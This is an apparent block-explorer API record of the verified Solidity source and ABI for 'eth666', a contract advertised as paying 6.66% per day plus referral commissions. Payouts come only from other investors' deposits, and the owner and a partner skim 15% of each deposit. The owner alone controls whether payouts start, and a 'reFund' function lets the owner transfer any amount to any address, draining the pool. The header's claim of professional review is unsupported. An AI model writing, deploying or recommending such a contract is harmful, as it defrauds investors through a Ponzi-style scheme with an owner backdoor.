{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n/** \r\n * contract for eth666.me\r\n * GAIN 6.66% PER 24 HOURS (every 5900 blocks)\r\n * \r\n *  How to use:\r\n *  1. Send any amount of ether to make an investment\r\n *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\r\n *  OR\r\n *  2b. Send more ether to reinvest AND get your profit at the same time\r\n *\r\n * \r\n *  5% for every deposit of your direct partners\r\n *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a \"DATA\" field during a deposit transaction.\r\n * \r\n * \r\n * RECOMMENDED GAS LIMIT: 70000\r\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n *\r\n * Contract reviewed and approved by pros!\r\n**/\r\n\r\ncontract eth666{\r\n\r\n    address public owner;\r\n    address public partner;    \r\n    \r\n\tmapping (address => uint256) deposited;\r\n\tmapping (address => uint256) withdrew;\r\n\tmapping (address => uint256) refearned;\r\n\tmapping (address => uint256) blocklock;\r\n\r\n\tuint256 public totalDepositedWei = 0;\r\n\tuint256 public totalWithdrewWei = 0;\r\n\tuint256 public investorNum = 0;\r\n\t\r\n\t//if isStart = 0 !!!!DO NOT INVEST!!!! please wait for gameStart()\r\n\tuint \tpublic isStart; \r\n\r\n\tevent invest(address indexed beneficiary, uint amount);\r\n\r\n    constructor () public {\r\n        owner   = msg.sender;\r\n        partner = msg.sender;\r\n        isStart = 0;\r\n    }\r\n    \r\n    modifier onlyOwner {\r\n        require (msg.sender == owner, \"OnlyOwner methods called by non-owner.\");\r\n        _;\r\n    }    \r\n    \r\n    //if you want to be a partner , contact admin\r\n    function setPartner(address newPartner) external onlyOwner {\r\n        partner = newPartner;\r\n    }\r\n \r\n \tfunction gameStart(uint num) external onlyOwner{\r\n \t\tisStart = num;\r\n \t}\r\n\r\n\tfunction() payable external {\r\n\t\temit invest(msg.sender,msg.value);\r\n\t\tuint256 admRefPerc = msg.value / 10;\r\n\t\tuint256 advPerc    = msg.value / 20;\r\n\r\n\t\towner.transfer(admRefPerc);\r\n\t\tpartner.transfer(advPerc);\r\n\r\n\t\tif (deposited[msg.sender] != 0 && isStart != 0) {\r\n\t\t\taddress investor = msg.sender;\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * 6.66% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 depositsPercents = deposited[msg.sender] * 666 / 10000 * (block.number - blocklock[msg.sender]) /5900;\r\n\t\t\tinvestor.transfer(depositsPercents);\r\n\r\n\t\t\twithdrew[msg.sender] += depositsPercents;\r\n\t\t\ttotalWithdrewWei += depositsPercents;\r\n\t\t} else if (deposited[msg.sender] == 0 && isStart != 0)\r\n\t\t\tinvestorNum += 1;\r\n\r\n\t\taddress referrer = bytesToAddress(msg.data);\r\n\t\tif (referrer > 0x0 && referrer != msg.sender) {\r\n\t\t\treferrer.transfer(admRefPerc);\r\n\t\t\trefearned[referrer] += advPerc;\r\n\t\t}\r\n\r\n\t\tblocklock[msg.sender] = block.number;\r\n\t\tdeposited[msg.sender] += msg.value;\r\n\t\ttotalDepositedWei += msg.value;\r\n\t}\r\n\t\r\n\t//refund to user who misunderstood the game . 'withdrew' must = 0\r\n    function reFund(address exitUser, uint a) external onlyOwner {\r\n        uint256 c1 = withdrew[exitUser];\r\n        if(c1 == 0)\r\n          uint256 reFundValue = deposited[exitUser];\r\n          exitUser.transfer(a);\r\n          deposited[exitUser] = 0;\r\n    }\r\n    \r\n\tfunction userDepositedWei(address _address) public view returns (uint256) {\r\n\t\treturn deposited[_address];\r\n    }\r\n\r\n\tfunction userWithdrewWei(address _address) public view returns (uint256) {\r\n\t\treturn withdrew[_address];\r\n    }\r\n\r\n\tfunction userDividendsWei(address _address) public view returns (uint256) {\r\n        return deposited[_address] * 666 / 10000 * (block.number - blocklock[_address]) / 5900;\r\n    }\r\n\r\n\tfunction userReferralsWei(address _address) public view returns (uint256) {\r\n\t\treturn refearned[_address];\r\n    }\r\n\r\n\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\r\n\t\tassembly {\r\n\t\t\taddr := mload(add(bys, 20))\r\n\t\t}\r\n\t}\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDividendsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investorNum\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isStart\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newPartner\",\"type\":\"address\"}],\"name\":\"setPartner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"gameStart\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"partner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"exitUser\",\"type\":\"address\"},{\"name\":\"a\",\"type\":\"uint256\"}],\"name\":\"reFund\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userReferralsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"beneficiary\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"invest\",\"type\":\"event\"}]","ContractName":"eth666","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://0a64248b836650f3c6de81ba432170542006700dbc514a5cf81fdbcd89221816"}]}